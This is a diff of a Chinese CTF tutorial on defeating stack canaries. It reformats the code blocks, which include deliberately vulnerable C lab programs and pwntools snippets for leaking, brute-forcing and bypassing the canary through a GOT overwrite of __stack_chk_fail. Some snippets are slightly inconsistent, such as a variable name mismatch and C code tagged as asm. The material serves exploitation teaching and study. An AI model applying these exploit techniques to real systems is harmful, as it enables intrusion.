@@ -18,12 +18,10 @@ Canary就是在栈底放一个随机数，如果缓冲区变量溢出，那么�
 >
 >
 
-```
-
+```asm
 mov     rbp, rsp
 sub     rsp, 20h
 mov     rax, fs:28h
-
 ```
 
 但是Canary的非即时检测就留下了一定的操作空间：
@@ -50,95 +48,19 @@ mov     rax, fs:28h
 假设有一个题目这样布局
 
 
-```
-
-char
-
-buf
-[
-24
-];
-
-// [rsp+0h] [rbp-20h] BYREF
-
-
-unsigned
-
-__int64
-
-v2
-;
-
-// [rsp+18h] [rbp-8h]
-
+```c
+  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
+  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
 ```
 
 可以这样覆盖并泄露
 
 
 ```
-
-off_set
-
-=
-
-b
-'A'
-*
-(
-0x20
--
-0x8
-)
-
-p
-.
-sendline
-(
-off_set
-)
-
-result
-
-=
-
-p
-.
-recvuntil
-(
-b
-'a'
-*
-(
-0x20
--
-0x8
-)
-+
-b
-'
-\n
-'
-)
-
-canary
-
-=
-
-u64
-(
-b
-'
-\x00
-'
-+
-p
-.
-recv
-(
-7
-))
-
+off_set = b'A'*(0x20-0x8)
+p.sendline(off_set)
+result = p.recvuntil(b'a'*(0x20-0x8)+b'\n')
+canary = u64(b'\x00'+p.recv(7))
 ```
 
 
@@ -156,41 +78,9 @@ payload如下：
 
 
 ```
-
-payload
-
-=
-
-b
-'%9$x'
-
-p
-.
-sendline
-(
-payload
-)
-
-canary
-
-=
-
-int
-(
-p
-.
-recvuntil
-(
-'
-\n
-'
-)[:
--
-1
-],
-16
-)
-
+payload = b'%9$x'
+p.sendline(payload)
+canary = int(p.recvuntil('\n')[:-1],16)
 ```
 
 
@@ -210,228 +100,52 @@ recvuntil
 例程：
 
 
-```
+```asm
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>  
+#include <sys/wait.h>
 
-#include
-
-<stdio.h>
-
-#include
-
-<stdlib.h>
-
-#include
-
-<unistd.h>
-
-#include
-
-<string.h>
-
-#include
-
-<sys/types.h>
-
-
-#include
-
-<sys/wait.h>
-
-void
-
-getshell
-(
-void
-)
-
+void getshell(void)
 {
-
-
-system
-(
-"/bin/sh"
-);
-
+    system("/bin/sh");
 }
 
-void
-
-init
-(
-void
-)
-
+void init(void)
 {
-
-
-setbuf
-(
-stdin
-,
-
-0
-);
-
-
-setbuf
-(
-stdout
-,
-
-0
-);
-
-
-setbuf
-(
-stderr
-,
-
-0
-);
-
+    setbuf(stdin, 0);
+    setbuf(stdout, 0);
+    setbuf(stderr, 0);
 }
 
-void
-
-vuln
-(
-void
-)
-
+void vuln(void)
 {
-
-
-char
-
-buf
-[
-100
-];
-
-
-memset
-(
-buf
-,
-
-0
-,
-
-sizeof
-(
-buf
-));
-
-
-read
-(
-0
-,
-
-buf
-,
-
-0x200
-);
-
-
-printf
-(
-"%s
-\n
-"
-,
-
-buf
-);
-
+    char buf[100];
+    memset(buf, 0, sizeof(buf));
+    read(0, buf, 0x200);
+    printf("%s\n", buf);
 }
-
-int
-
-main
-(
-void
-)
-
+int main(void)
 {
+    init();
+    while (1)
+    {
+        printf("Hello Hacker!\n");
+        if (fork()) //father
+        {
+            wait(NULL);
+        }
+        else //child
+        {
+            vuln();
+            exit(0);
+        }
+    }
 
-
-init
-();
-
-
-while
-
-(
-1
-)
-
-
-{
-
-
-printf
-(
-"Hello Hacker!
-\n
-"
-);
-
-
-if
-
-(
-fork
-())
-
-//father
-
-
-{
-
-
-wait
-(
-NULL
-);
-
-
+    return 0;
 }
-
-
-else
-
-//child
-
-
-{
-
-
-vuln
-();
-
-
-exit
-(
-0
-);
-
-
-}
-
-
-}
-
-
-return
-
-0
-;
-
-}
-
 ```
 
 `gcc pwn.c -no-pie -m32 -fstack-protector -z noexecstack -o pwn`编译
@@ -439,157 +153,20 @@ return
 payload构造
 
 
-```
-
-canary
-
-=
-
-b
-'
-\x00
-'
-
-for
-
-i
-
-in
-
-range
-(
-3
-):
-
-
-for
-
-j
-
-in
-
-range
-(
-0
-,
-256
-):
-
-
-payload
-
-=
-
-b
-'a'
-*
-(
-0x70
--
-0xC
-)
-+
-canary
-+
-p8
-(
-j
-)
-
-
-p
-.
-send
-(
-payload
-)
-
-
-
-# time.sleep(0.1)
-
-
-res
-
-=
-
-p
-.
-recv
-()
-
-
-if
-
-(
-b
-'stack smashing detected'
-
-not
-
-in
-
-res
-):
-
-
-print
-(
-f
-'the
-{
-i
-}
- is
-{
-hex
-(
-j
-)
-}
-'
-)
-
-
-canary
-
-+=
-p8
-(
-j
-)
-
-
-break
-
-
-assert
-(
-len
-(
-canary
-)
-
-==
-
-i
-+
-2
-)
-
-log
-.
-info
-(
-'Canary；'
-+
-hex
-(
-u32
-((
-canary
-))))
-
+```python
+canary = b'\x00'
+for i in range(3):
+    for j in range(0,256):
+        payload = b'a'*(0x70-0xC)+canary+p8(j)
+        p.send(payload)
+        # time.sleep(0.1)
+        res = p.recv()
+        if (b'stack smashing detected' not in res):
+            print(f'the {i} is {hex(j)}')
+            canary +=p8(j)
+            break
+    assert(len(canary) == i+2)
+log.info('Canary；'+hex(u32((canary))))
 ```
 
 
@@ -609,122 +186,26 @@ SSP全称为`Stack Smashing Protect`，这种方法可以读取内存中的值�
 例程：
 
 
-```
-
-#include
-
-<stdio.h>
-
-#include
-
-<stdlib.h>
-
-#include
-
-<unistd.h>
-
-#include
-
-<string.h>
-
-void
-
-getshell
-(
-void
-)
-
+```asm
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+void getshell(void)
 {
-
-
-system
-(
-"/bin/sh"
-);
-
+    system("/bin/sh");
 }
-
-int
-
-main
-(
-int
-
-argc
-,
-
-char
-
-*
-argv
-[])
-
+int main(int argc, char *argv[])
 {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
 
-
-setbuf
-(
-stdin
-,
-
-NULL
-);
-
-
-setbuf
-(
-stdout
-,
-
-NULL
-);
-
-
-setbuf
-(
-stderr
-,
-
-NULL
-);
-
-
-char
-
-buf
-[
-100
-];
-
-
-read
-(
-0
-,
-
-buf
-,
-
-200
-);
-
-#
-栈溢出
-
-
-printf
-(
-buf
-);
-
-
-return
-
-0
-;
-
+    char buf[100];
+    read(0, buf, 200);#栈溢出
+    printf(buf);
+    return 0;
 }
-
 ```
 
 `gcc pwn.c -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o pwn`编译
@@ -738,61 +219,9 @@ return
 
 
 ```
-
-_stack_chk_fail_got
-
-=
-
-elf
-.
-got
-[
-'_stack_chk_fail'
-]
-
-backdoor
-
-=
-
-elf
-.
-sym
-[
-'getshell'
-]
-
-payload
-
-=
-
-fmtstr_payload
-(
-10
-,{
-stack_chk_fail_got
-:
-backdoor
-})
-
-payload
-
-=
-
-payload
-.
-ljust
-(
-0x70
-,
-b
-'a'
-)
-
-p
-.
-send
-(
-payload
-)
-
+_stack_chk_fail_got = elf.got['_stack_chk_fail']
+backdoor = elf.sym['getshell']
+payload = fmtstr_payload(10,{stack_chk_fail_got:backdoor})
+payload = payload.ljust(0x70,b'a')
+p.send(payload)
 ```
